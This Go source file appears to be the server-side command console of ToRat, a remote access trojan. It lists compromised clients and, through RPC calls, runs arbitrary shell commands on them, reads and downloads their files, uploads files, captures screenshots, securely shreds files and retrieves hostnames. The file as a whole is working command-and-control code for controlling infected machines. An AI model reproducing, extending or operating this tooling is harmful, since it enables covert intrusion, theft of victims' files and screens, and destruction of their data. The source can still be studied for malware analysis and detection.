package server

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/models"
	"github.com/lu4p/ToRat/torat_server/crypto"
	"github.com/lu4p/shred"
)

var void int

// SERVER SIDE INTERACTIVE SHELL MENU
func Shell() {
	shell := ishell.New()
	cwd, err := os.Getwd()

	if err != nil {
		fmt.Println(green("[Server] ") + red("[!] ", err))
		panic(err)
	}
	shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

	// SELECT CLIENT
	shell.AddCmd(&ishell.Cmd{
		Name: "select",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				fmt.Println(green("[Server] ") + red("[!] No clients to select!"))
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to interact with:")
			client := getClient(choice)
			client.shellClient()
		},
		Help: "interact with a client",
	})

	// LIST CLIENTS
	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
				return
			}
			printClients()
		},
		Help: "list all connected clients",
	})

	// SET ALIAS
	shell.AddCmd(&ishell.Cmd{
		Name: "alias",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
			} else {
				choice := c.MultiChoice(listConn(), "Select client to give an alias:")
				fmt.Println(green("Type an alias for selected client:"))
				name := c.ReadLine()
				client := activeClients[choice]

				// ISSUE #173
				client.Client.Name = name
				db.Save(&client.Client)
			}
		},
		Help: "give a client an alias",
	})

	// CHANGE DIRECTORY
	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {

			path := strings.Join(c.Args, " ")
			err := os.Chdir(path)

			if err != nil {
				fmt.Println(green("[Server] ") + red("[!] Cannot navigate to that path!"))
				fmt.Println(green("[Server] ") + red("[!] ", err))
			}
			cwd, _ := os.Getwd()
			shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

		},
		Help: "change the working directory of the server",
	})

	// EXIT THE SERVER
	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			fmt.Println(green("[Server] ") + red("Exiting Now!"))
			c.Stop()
		},
		Help: "exit the server",
	})

	shell.NotFound(runCommand)

	shell.Run()
}

// SERVER SIDE SHELL COMMAND
func runCommand(c *ishell.Context) {
	var osshell string
	var osshellargs []string
	command := strings.Join(c.Args, " ")

	if runtime.GOOS == "linux" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", command}
	} else if runtime.GOOS == "windows" {
		osshell = "cmd"
		osshellargs = []string{"/C", command}
	} else if runtime.GOOS == "darwin" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", command}
	}

	execcmd := exec.Command(osshell, osshellargs...)
	cmdout, err := execcmd.Output()

	if err != nil {
		c.Println(green("[Server] ") + red("[!] Bad or unknown command!"))
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	} else if cmdout == nil {
		c.Println(green("[Server] ") + "No output returned by command!")
		return
	} else {
		c.Println(string(cmdout))
	}
}

// CLIENT SIDE INTERACTIVE SHELL MENU
func (client activeClient) shellClient() {
	fileCompleter := func([]string) []string {
		return client.Dir.Files
	}

	// SET SHELL AND GET WORKING DIR
	shell := ishell.New()
	r := models.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		// TODO: This may cause false positive on edges cases
		client.Dir.Path = "DISCONNECTED"
	}
	client.Dir = r

	shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")

	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {
			client.Cd(c)
			shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
		},
		Completer: fileCompleter,
		Help:      "change the working directory of the client",
	})

	shell.AddCmd(&ishell.Cmd{
		Name:      "cat",
		Func:      client.Cat,
		Help:      "print the content of a file: usage cat <file>",
		Completer: fileCompleter,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:      "down",
		Func:      client.Download,
		Help:      "download a file from the client: usage down <file>",
		Completer: fileCompleter,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "up",
		Func: client.Upload,
		Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "screen",
		Func: client.Screen,
		Help: "take a screenshot of the client and upload it to the server",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "escape",
		Func: client.runCommand,
		Help: "escape a command and run it natively on client",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "reconnect",
		Func: func(c *ishell.Context) {
			client.Reconnect(c)
			shell.Close()
		},
		Help: "tell the client to reconnect",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			c.Stop()
			shell.Close()
		},
		Help: "background the current session",
	})

	shell.NotFound(client.runCommand)
	shell.Run()
}

// LS REMOTE DIRECTORY
func (client *activeClient) ls(c *ishell.Context) {
	r := models.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	client.Dir = r
	for _, f := range client.Dir.Files {
		c.Println(f)
	}
}

// CAT REMOTE FILE
func (client *activeClient) Cat(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	var r string
	err := client.RPC.Call("API.Cat", path, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not cat file!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	c.Println(r)
}

// CHANGE REMOTE DIRECTORY
func (client *activeClient) Cd(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	r := models.Dir{}
	err := client.RPC.Call("API.Cd", path, &r)

	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	client.Dir = r
}

// DOWNLOAD A REMOTE FILE
func (client *activeClient) Download(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	filename := strings.Join(c.Args, " ")
	var r models.File
	err := client.RPC.Call("API.SendFile", filename, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server!"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	path := filepath.Join(client.Client.Path, filename)
	err = ioutil.WriteFile(path, r.Content, 0600)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Download received"))
	c.ProgressBar().Stop()

}

// UPLOAD A LOCAL FILE
func (client *activeClient) Upload(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	info, _ := os.Stat(path)
	content, err := ioutil.ReadFile(path)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
	}

	f := models.File{
		Content: content,
		Path:    path,
		Perm:    info.Mode(),
	}

	err = client.RPC.Call("API.RecvFile", f, &void)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Upload Successful"))
	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Upload successfully received"))
	c.ProgressBar().Stop()
}

// CAPTURE REMOTE SCREENSHOT
func (client *activeClient) Screen(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	filename := getTimeSt() + ".png"
	var r []byte

	err := client.RPC.Call("API.Screen", void, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed!"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	err = ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
	c.ProgressBar().Stop()

}

// FORCE CLIENT RECONNECT
// TODO: I don't think this feature works
func (client *activeClient) Reconnect(c *ishell.Context) {
	var r bool
	client.RPC.Call("API.Reconnect", void, &r)
	c.Stop()
}

// PING SOMETHING?
// TODO: I don't think this feature works
func (client *activeClient) Ping(c *ishell.Context) error {
	return client.RPC.Call("API.Ping", void, &void)
}

// REMOVE FILE
// TODO: Is this used? Where?
func (client *activeClient) Shred(c *ishell.Context) {
	args := models.Shred{
		Conf: shred.Conf{
			Times:  3,
			Zeros:  true,
			Remove: true,
		},
		Path: strings.Join(c.Args, " "),
	}
	var r error
	err := client.RPC.Call("API.Shred", &args, &r)
	if err != nil {
		c.Println(red("[!] Could not shred path:", args.Path, err, r))
	}
}

// GET HOSTNAME OF CLIENT
// TODO: Is this used? Where?
func (client *activeClient) GetHostname() error {
	var encHostname models.EncAsym

	err := client.RPC.Call("API.Hostname", void, &encHostname)
	if err != nil {
		return err
	}
	byteHostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		return err
	}
	client.Hostname = string(byteHostname)
	return nil
}
